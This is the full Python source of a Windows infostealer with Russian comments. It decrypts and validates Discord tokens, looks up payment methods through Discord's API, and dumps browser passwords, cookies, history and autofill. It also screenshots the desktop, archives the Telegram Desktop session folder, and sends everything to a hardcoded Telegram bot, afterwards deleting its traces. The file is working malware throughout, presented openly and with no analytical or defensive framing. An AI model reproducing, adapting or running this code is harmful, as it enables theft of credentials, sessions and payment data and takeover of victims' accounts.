import os
import subprocess
import sys

def install_and_import(modules):
    """Автоматически устанавливает и импортирует модули"""
    for module_name, pip_name in modules:
        try:
            __import__(module_name)
        except ImportError:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pip_name],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                pass

REQUIRED_MODULES = [
    ("requests", "requests"),
    ("win32crypt", "pypiwin32"),
    ("Crypto.Cipher", "pycryptodome"),
    ("PIL", "pillow"),
    ("psutil", "psutil"),
]


install_and_import(REQUIRED_MODULES)


import zipfile
import requests
from pathlib import Path
import tempfile
import shutil
import re
import json
import base64
import datetime
import sqlite3
import platform

import win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab
import psutil


BOT_TOKEN = "8082354163:AAGXMS1t3wUNzpxMfg2cj27Ex9zFmM9uE9Y"
CHAT_ID = "7596829052"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

DISCORD_PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
}

BROWSER_PATHS = {
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome Beta': LOCAL + '\\Google\\Chrome Beta\\User Data',
    'Chrome Canary': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
}

def getheaders(token=None):
    """Создает заголовки для Discord API"""
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    """Извлекает зашифрованные токены из leveldb"""
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    
    if not os.path.exists(path):
        return tokens
    
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except:
            continue
    
    return tokens

def getkey(path):
    """Получает ключ шифрования из Local State"""
    try:
        with open(path + "\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
        return key
    except:
        return None

def getip():
    """Получает внешний IP адрес"""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json().get("ip", "None")
    except:
        return "None"

def get_system_info():
    """Получает подробную информацию о системе"""
    try:
        cpu_info = platform.processor()
        cpu_count = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        
        ram = psutil.virtual_memory()
        ram_total = ram.total / (1024**3)
        
        disk = psutil.disk_usage('C:\\')
        disk_total = disk.total / (1024**3)
        disk_used = disk.used / (1024**3)
        
        gpu_info = "N/A"
        try:
            import wmi
            w = wmi.WMI()
            gpu_info = w.Win32_VideoController()[0].Name
        except:
            pass
        
        return {
            'ip': getip(),
            'pc_name': os.getenv('COMPUTERNAME', 'N/A'),
            'username': os.getenv('USERNAME', 'N/A'),
            'os': f"{platform.system()} {platform.release()}",
            'os_version': platform.version(),
            'cpu': cpu_info,
            'cpu_cores': f"{cpu_count} cores / {cpu_threads} threads",
            'ram': f"{ram_total:.1f} GB",
            'disk': f"{disk_used:.0f} GB / {disk_total:.0f} GB",
            'gpu': gpu_info
        }
    except:
        return {
            'ip': getip(),
            'pc_name': os.getenv('COMPUTERNAME', 'N/A'),
            'username': os.getenv('USERNAME', 'N/A'),
            'os': 'Unknown'
        }

def take_screenshot():
    """Делает скриншот экрана"""
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
        screenshot.save(screenshot_path, "PNG")
        return screenshot_path
    except:
        return None

def decrypt_token(encrypted_token, key):
    """Расшифровывает токен Discord"""
    try:
        encrypted_token = encrypted_token.replace("\\", "") if encrypted_token.endswith("\\") else encrypted_token
        decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        nonce = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])[3:15]
        cipher_text = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])[15:]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)
        token = cipher.decrypt(cipher_text)[:-16].decode()
        return token
    except:
        return None

def get_discord_user_info(token):
    """Получает информацию о пользователе Discord через API"""
    try:
        headers = getheaders(token)
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
        if response.status_code != 200:
            return None
        
        user_data = response.json()
        
        response = requests.get('https://discordapp.com/api/v6/users/@me/guilds?with_counts=true', headers=headers, timeout=10)
        guilds = response.json() if response.status_code == 200 else []
        
        admin_guilds = []
        for guild in guilds:
            if guild.get('permissions', 0) & 8 or guild.get('permissions', 0) & 32:
                try:
                    guild_response = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=headers, timeout=5)
                    if guild_response.status_code == 200:
                        guild_info = guild_response.json()
                        vanity = f"; .gg/{guild_info['vanity_url_code']}" if guild_info.get('vanity_url_code') else ""
                        admin_guilds.append(f"{guild['name']}: {guild.get('approximate_member_count', 'N/A')}{vanity}")
                except:
                    pass
        
        response = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=10)
        nitro_data = response.json() if response.status_code == 200 else []
        has_nitro = len(nitro_data) > 0
        exp_date = None
        if has_nitro:
            try:
                exp_date = datetime.datetime.strptime(nitro_data[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y')
            except:
                exp_date = "Unknown"
        
        response = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=headers, timeout=10)
        boosts = response.json() if response.status_code == 200 else []
        available_boosts = sum(1 for b in boosts if datetime.datetime.strptime(b["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z") - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0))
        
        response = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=10)
        payments = response.json() if response.status_code == 200 else []
        payment_methods = []
        valid_payments = 0
        for payment in payments:
            if payment.get('type') == 1:
                payment_methods.append("CreditCard")
                if not payment.get('invalid'):
                    valid_payments += 1
            elif payment.get('type') == 2:
                payment_methods.append("PayPal")
                if not payment.get('invalid'):
                    valid_payments += 1
        
        return {
            'user_data': user_data,
            'guilds_count': len(guilds),
            'admin_guilds': admin_guilds,
            'has_nitro': has_nitro,
            'nitro_expiration': exp_date,
            'boosts_available': available_boosts,
            'payment_methods': payment_methods,
            'valid_payments': valid_payments
        }
    except:
        return None

def grab_discord_tokens():
    """Граббинг Discord токенов"""
    checked_tokens = []
    discord_data = []
    
    for platform, path in DISCORD_PATHS.items():
        if not os.path.exists(path):
            continue
        
        encrypted_tokens = gettokens(path)
        if not encrypted_tokens:
            continue
        
        key = getkey(path)
        if not key:
            continue
        
        for encrypted_token in encrypted_tokens:
            token = decrypt_token(encrypted_token, key)
            if not token or token in checked_tokens:
                continue
            
            checked_tokens.append(token)
            info = get_discord_user_info(token)
            
            if info:
                discord_data.append({'token': token, 'platform': platform, 'info': info})
    
    return discord_data

def get_chrome_key(browser_path):
    """Получает ключ расшифровки для браузера"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(encrypted_password, key):
    """Расшифровывает пароль из браузера"""
    try:
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            nonce = encrypted_password[3:15]
            cipher = AES.new(key, AES.MODE_GCM, nonce)
            return cipher.decrypt(encrypted_password[15:-16]).decode('utf-8')
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
    except:
        return None

def get_browser_passwords(browser_name, browser_path):
    """Извлекает пароли из браузера"""
    passwords = []
    try:
        key = get_chrome_key(browser_path)
        if not key:
            return passwords
        
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(browser_path, f"Profile {i}"))]
        
        for profile in profiles:
            login_data_path = os.path.join(browser_path, profile, "Login Data")
            if not os.path.exists(login_data_path):
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"LoginData_{browser_name}_{profile}.db")
            try:
                shutil.copy2(login_data_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    if row[1] and row[2]:
                        pwd = decrypt_password(row[2], key)
                        if pwd:
                            passwords.append({'url': row[0], 'username': row[1], 'password': pwd, 'browser': browser_name, 'profile': profile})
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    except:
        pass
    return passwords

def get_browser_cookies(browser_name, browser_path):
    """Извлекает cookies из браузера в формате Netscape"""
    cookies = []
    try:
        key = get_chrome_key(browser_path)
        if not key:
            return cookies
        
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(browser_path, f"Profile {i}"))]
        
        for profile in profiles:
            cookies_path = os.path.join(browser_path, profile, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(browser_path, profile, "Cookies")
            if not os.path.exists(cookies_path):
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"Cookies_{browser_name}_{profile}.db")
            try:
                shutil.copy2(cookies_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies")
                
                for row in cursor.fetchall():
                    if row[3]:
                        decrypted = decrypt_password(row[3], key)
                        if decrypted:
                            cookies.append({
                                'domain': row[0],
                                'name': row[1],
                                'path': row[2],
                                'value': decrypted,
                                'expires': row[4],
                                'secure': row[5],
                                'httponly': row[6],
                                'browser': browser_name,
                                'profile': profile
                            })
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    except:
        pass
    return cookies

def save_cookies_netscape(cookies):
    """Сохраняет cookies в формате Netscape"""
    if not cookies:
        return None
    
    cookies_file = os.path.join(tempfile.gettempdir(), "cookies.txt")
    
    try:
        with open(cookies_file, 'w', encoding='utf-8') as f:
            f.write("# Netscape HTTP Cookie File\n")
            f.write("# This is a generated file! Do not edit.\n\n")
            
            for cookie in cookies:
                domain = cookie['domain']
                flag = "TRUE" if domain.startswith('.') else "FALSE"
                path = cookie['path']
                secure = "TRUE" if cookie['secure'] else "FALSE"
                expires = cookie['expires'] if cookie['expires'] else "0"
                name = cookie['name']
                value = cookie['value']
                
                f.write(f"{domain}\t{flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}\n")
        
        return cookies_file
    except:
        return None

def get_browser_history(browser_name, browser_path):
    """Извлекает историю из браузера"""
    history = []
    try:
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(browser_path, f"Profile {i}"))]
        
        for profile in profiles:
            history_path = os.path.join(browser_path, profile, "History")
            if not os.path.exists(history_path):
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"History_{browser_name}_{profile}.db")
            try:
                shutil.copy2(history_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100")
                
                for row in cursor.fetchall():
                    history.append({'url': row[0], 'title': row[1], 'visits': row[2], 'browser': browser_name})
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    except:
        pass
    return history

def get_browser_autofill(browser_name, browser_path):
    """Извлекает автозаполнение из браузера"""
    autofill = []
    try:
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(browser_path, f"Profile {i}"))]
        
        for profile in profiles:
            webdata_path = os.path.join(browser_path, profile, "Web Data")
            if not os.path.exists(webdata_path):
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), f"WebData_{browser_name}_{profile}.db")
            try:
                shutil.copy2(webdata_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value, count FROM autofill ORDER BY count DESC LIMIT 50")
                
                for row in cursor.fetchall():
                    autofill.append({'name': row[0], 'value': row[1], 'count': row[2], 'browser': browser_name})
                conn.close()
            except:
                pass
            finally:
                try:
                    os.remove(temp_db)
                except:
                    pass
    except:
        pass
    return autofill

def grab_browser_data():
    """Граббинг всех данных из браузеров"""
    all_passwords = []
    all_cookies = []
    all_history = []
    all_autofill = []
    
    for browser_name, browser_path in BROWSER_PATHS.items():
        if not os.path.exists(browser_path):
            continue
        
        passwords = get_browser_passwords(browser_name, browser_path)
        cookies = get_browser_cookies(browser_name, browser_path)
        history = get_browser_history(browser_name, browser_path)
        autofill = get_browser_autofill(browser_name, browser_path)
        
        all_passwords.extend(passwords)
        all_cookies.extend(cookies)
        all_history.extend(history)
        all_autofill.extend(autofill)
    
    return all_passwords, all_cookies, all_history, all_autofill

def find_tdata_path():
    """Находит путь к папке tdata Telegram"""
    paths = [
        Path(ROAMING) / "Telegram Desktop" / "tdata",
        Path(LOCAL) / "Telegram Desktop" / "tdata"
    ]
    for path in paths:
        if path.exists():
            return path
    return None

def create_archive(source_folder, output_path):
    """Создает минимальный ZIP архив только с файлами для входа"""
    skip_dirs = ['media_cache', 'user_data', 'emoji', 'stickers', 'working', 'dumps', 'tdummy', 'temp']
    skip_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.webm', '.mp3', '.ogg', '.tgs']
    
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_folder):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            
            for file in files:
                file_lower = file.lower()
                
                if any(file_lower.endswith(ext) for ext in skip_extensions):
                    continue
                
                important_patterns = ['key_data', 'settings', 'maps', 'usertag', 'binlog', 'shortcuts-custom.json', 'prefix']
                
                is_important = any(pattern in file_lower for pattern in important_patterns)
                is_account_file = len(file) == 16 and all(c in '0123456789ABCDEFabcdef' for c in file)
                is_account_file_variant = (len(file) >= 16 and all(c in '0123456789ABCDEFabcdef' for c in file[:16]))
                
                if is_important or is_account_file or is_account_file_variant:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_folder)
                    try:
                        zipf.write(file_path, arcname)
                    except:
                        pass
    
    return output_path

def send_file_to_telegram(file_path, bot_token, chat_id, caption='📦 Файл'):
    """Отправляет файл в Telegram"""
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data)
    
    return response.status_code == 200

def send_photo_to_telegram(photo_path, bot_token, chat_id, caption=''):
    """Отправляет фото в Telegram"""
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': chat_id, 'caption': caption}
        response = requests.post(url, files=files, data=data)
    
    return response.status_code == 200

def send_message_to_telegram(message, bot_token, chat_id):
    """Отправляет текстовое сообщение в Telegram"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    response = requests.post(url, data=data)
    return response.status_code == 200

def create_combined_file(discord_data, passwords, cookies, history, autofill):
    """Создает txt файл со всеми данными"""
    temp_file = os.path.join(tempfile.gettempdir(), "grabbed_data.txt")
    
    with open(temp_file, 'w', encoding='utf-8') as f:
        f.write("=" * 70 + "\n")
        f.write("           GRABBED DATA - ALL INFORMATION\n")
        f.write("=" * 70 + "\n\n")
        
        f.write(f"IP: {getip()}\n")
        f.write(f"ПК: {os.getenv('COMPUTERNAME', 'N/A')}\n")
        f.write(f"Пользователь: {os.getenv('USERNAME', 'N/A')}\n")
        f.write(f"Дата: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
        f.write("\n" + "=" * 70 + "\n\n")
        

        if discord_data:
            f.write(f"╔{'═' * 68}╗\n")
            f.write(f"║{' ' * 22}DISCORD TOKENS ({len(discord_data)}){' ' * 23}║\n")
            f.write(f"╚{'═' * 68}╝\n\n")
            
            for data in discord_data:
                user = data['info']['user_data']
                f.write(f"{'=' * 60}\n")
                f.write(f"USERNAME: {user['username']}\n")
                f.write(f"Email: {user.get('email', 'N/A')}\n")
                f.write(f"Phone: {user.get('phone', 'N/A')}\n")
                f.write(f"ID: {user['id']}\n")
                f.write(f"Nitro: {data['info']['has_nitro']}\n")
                f.write(f"Серверов: {data['info']['guilds_count']}\n")
                f.write(f"TOKEN: {data['token']}\n")
                f.write(f"{'=' * 60}\n\n")
        

        if passwords:
            f.write(f"\n╔{'═' * 68}╗\n")
            f.write(f"║{' ' * 21}BROWSER PASSWORDS ({len(passwords)}){' ' * 20}║\n")
            f.write(f"╚{'═' * 68}╝\n\n")
            
            passwords_by_browser = {}
            for pwd in passwords:
                browser = pwd['browser']
                if browser not in passwords_by_browser:
                    passwords_by_browser[browser] = []
                passwords_by_browser[browser].append(pwd)
            
            for browser, browser_passwords in passwords_by_browser.items():
                f.write(f"\n{'─' * 70}\n{browser} - {len(browser_passwords)} паролей\n{'─' * 70}\n\n")
                for i, pwd in enumerate(browser_passwords, 1):
                    f.write(f"{i}. URL: {pwd['url']}\n")
                    f.write(f"   Login: {pwd['username']}\n")
                    f.write(f"   Password: {pwd['password']}\n")
                    f.write(f"   {'-' * 66}\n\n")
        if cookies:
            f.write(f"\n╔{'═' * 68}╗\n")
            f.write(f"║{' ' * 24}COOKIES ({len(cookies)}){' ' * 25}║\n")
            f.write(f"╚{'═' * 68}╝\n\n")
            
            cookies_by_browser = {}
            for cookie in cookies:
                browser = cookie['browser']
                if browser not in cookies_by_browser:
                    cookies_by_browser[browser] = []
                cookies_by_browser[browser].append(cookie)
            
            for browser, browser_cookies in cookies_by_browser.items():
                f.write(f"\n{'─' * 70}\n{browser} - {len(browser_cookies)} cookies\n{'─' * 70}\n\n")
                for i, cookie in enumerate(browser_cookies[:100], 1):
                    f.write(f"{i}. {cookie['domain']} | {cookie['name']}\n")
                    f.write(f"   Value: {cookie['value'][:80]}{'...' if len(cookie['value']) > 80 else ''}\n")
                    f.write(f"   Path: {cookie['path']}\n")
                    if i % 10 == 0:
                        f.write("\n")
        
 
        if history:
            f.write(f"\n\n╔{'═' * 68}╗\n")
            f.write(f"║{' ' * 23}HISTORY ({len(history)}){' ' * 24}║\n")
            f.write(f"╚{'═' * 68}╝\n\n")
            
            for i, h in enumerate(history[:100], 1):
                f.write(f"{i}. [{h['visits']} visits] {h['url']}\n")
                if h['title']:
                    f.write(f"   Title: {h['title']}\n")
        
  
        if autofill:
            f.write(f"\n\n╔{'═' * 68}╗\n")
            f.write(f"║{' ' * 23}AUTOFILL ({len(autofill)}){' ' * 24}║\n")
            f.write(f"╚{'═' * 68}╝\n\n")
            
            for i, auto in enumerate(autofill, 1):
                f.write(f"{i}. {auto['name']}: {auto['value']} (использовано {auto['count']}x)\n")
        
        # Статистика
        f.write("\n" + "=" * 70 + "\n")
        f.write("СТАТИСТИКА:\n")
        f.write(f"  Discord токенов: {len(discord_data)}\n")
        f.write(f"  Паролей: {len(passwords)}\n")
        f.write(f"  Cookies: {len(cookies)}\n")
        f.write(f"  История: {len(history)}\n")
        f.write(f"  Автозаполнение: {len(autofill)}\n")
        f.write("=" * 70 + "\n")
    
    return temp_file

def main():

    sys_info = get_system_info()
    
    info_message = f"""
🖥 <b>ИНФОРМАЦИЯ О СИСТЕМЕ</b>

📍 <b>Сеть:</b>
├ IP: <code>{sys_info['ip']}</code>
└ ПК: <code>{sys_info['pc_name']}</code>

👤 <b>Пользователь:</b>
└ <code>{sys_info['username']}</code>

💻 <b>Система:</b>
├ ОС: {sys_info['os']}
├ Версия: {sys_info.get('os_version', 'N/A')}

⚙️ <b>Железо:</b>
├ CPU: {sys_info.get('cpu', 'N/A')}
├ Ядра: {sys_info.get('cpu_cores', 'N/A')}
├ RAM: {sys_info.get('ram', 'N/A')}
├ Диск: {sys_info.get('disk', 'N/A')}
└ GPU: {sys_info.get('gpu', 'N/A')}

⏰ <b>Время:</b> {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}
"""
    
    send_message_to_telegram(info_message, BOT_TOKEN, CHAT_ID)
    
    screenshot_path = take_screenshot()
    if screenshot_path:
        send_photo_to_telegram(screenshot_path, BOT_TOKEN, CHAT_ID, "🖼 Screenshot")
        try:
            os.remove(screenshot_path)
        except:
            pass
    
   
    discord_data = grab_discord_tokens()
    passwords, cookies, history, autofill = grab_browser_data()
    

    grabbed_file = None
    if discord_data or passwords or cookies or history or autofill:
        grabbed_file = create_combined_file(discord_data, passwords, cookies, history, autofill)
        caption = f"📊 Discord:{len(discord_data)} | Пароли:{len(passwords)} | Cookies:{len(cookies)}"
        send_file_to_telegram(grabbed_file, BOT_TOKEN, CHAT_ID, caption)
    

    cookies_file = None
    if cookies:
        cookies_file = save_cookies_netscape(cookies)
        if cookies_file:
            send_file_to_telegram(cookies_file, BOT_TOKEN, CHAT_ID, f"🍪 Cookies ({len(cookies)} шт)")
    

    tdata_path = find_tdata_path()
    
    archive_path = None
    if tdata_path:
        archive_path = os.path.join(tempfile.gettempdir(), "tdata_backup.zip")
        try:
            create_archive(tdata_path, archive_path)
            send_file_to_telegram(archive_path, BOT_TOKEN, CHAT_ID, '📦 Telegram tdata')
        except:
            pass
    

    for file in [grabbed_file, cookies_file, archive_path]:
        if file:
            try:
                os.remove(file)
            except:
                pass

if __name__ == "__main__":
    main()
